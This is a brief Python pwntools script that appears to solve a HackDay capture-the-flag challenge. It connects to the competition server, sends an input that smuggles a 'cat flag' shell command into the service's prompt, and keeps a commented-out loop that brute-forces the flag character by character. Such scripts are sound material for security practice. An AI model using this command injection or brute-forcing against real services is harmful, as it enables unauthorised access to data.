from pwn import *
from print_color import print

# Set architecture, os and log level
context(arch="amd64", log_level="debug")

# Load the ELF file and execute it as a new process.
p = remote('challenges.hackday.fr', 48118)

valid_ascii = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._{}')

flag = "HACKDAY{"

p.sendlineafter("Your try? ", b"\\cat flag >")

data = p.recvline()

print(data)

# for char in valid_ascii:
#     content = char * 12
#     payload = flag + content + "}"

#     p.sendlineafter("Your try? ", payload)
#     data = p.recvline()

#     if data == b'Incorrect\n':
#         print(f"INCORRECT {payload}", color='red')
#     else:
#         print(data, tag='success', color='green')
#         break
